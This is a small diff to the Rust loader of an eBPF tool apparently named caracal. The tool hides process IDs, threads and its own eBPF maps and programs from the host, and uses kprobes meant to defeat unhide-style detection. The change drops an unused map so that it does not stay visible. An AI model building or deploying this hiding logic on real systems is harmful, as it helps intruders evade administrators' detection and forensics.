@@ -103,12 +103,13 @@ async fn main() -> anyhow::Result<()> {
             _ => {
                 warn!("CONFIG_BPF_KPROBE_OVERRIDE is not supported by host kernel");
                 warn!("deunhide kprobes won't be set");
+
                 vec![]
             }
         }
     };
 
-    //let kprobes = vec![];
+    let no_kprobe_loaded = kprobes.is_empty();
     let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
         "../../target/bpfel-unknown-none/release/caracal"
     ))?;
@@ -128,11 +129,16 @@ async fn main() -> anyhow::Result<()> {
     bpf_progs_info.append(&mut get_progs_info_from_progs_ids(bpf_prog_id));
 
     let full_bpf_info = fetch_progs_ids_map_ids(bpf_progs_info)?;
-
+    if no_kprobe_loaded {
+        // no kprobe is using CURRENT_TGID map => it is loaded but won't be hidden because not tied to any program. So we drop it here
+        let kprobe_map: HashMap<_, u64, u8> =
+            HashMap::try_from(ebpf.take_map("CURRENT_TGID").unwrap()).unwrap();
+        drop(kprobe_map)
+    }
     // setup HIDDEN_PIDS MAP
     let mut hidden_pids_map: HashMap<_, u32, u8> =
         HashMap::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
-    // setup HIDDEN_TREADS MAP
+    // setup HIDDEN_THREADS MAP
     let mut hidden_threads_map: HashMap<_, u32, u8> =
         HashMap::try_from(ebpf.take_map("HIDDEN_THREADS").unwrap()).unwrap();
 
